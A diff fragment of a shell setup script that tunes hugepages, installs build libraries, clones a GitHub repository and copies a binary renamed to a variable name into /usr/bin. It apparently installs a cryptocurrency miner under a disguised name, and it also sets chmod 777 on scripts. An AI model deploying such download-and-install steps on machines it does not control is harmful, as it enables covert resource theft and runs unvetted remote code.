@@ -34,12 +34,12 @@ sudo echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-sudo cd /tmp && mkdir $tmpfoldername
+cd /tmp && mkdir $tmpfoldername
 sudo git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
-sudo cd /tmp/$tmpfoldername
+cd /tmp/$tmpfoldername
 sudo mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
 sudo chmod +x /tmp/$tmpfoldername/$softwarename
-sudo chmod 777 *.sh
+sudo chmod 777 /tmp/$tmpfoldername/*.sh
 sudo cp /tmp/$tmpfoldername/$softwarename /usr/bin/
 
 ##########################################################
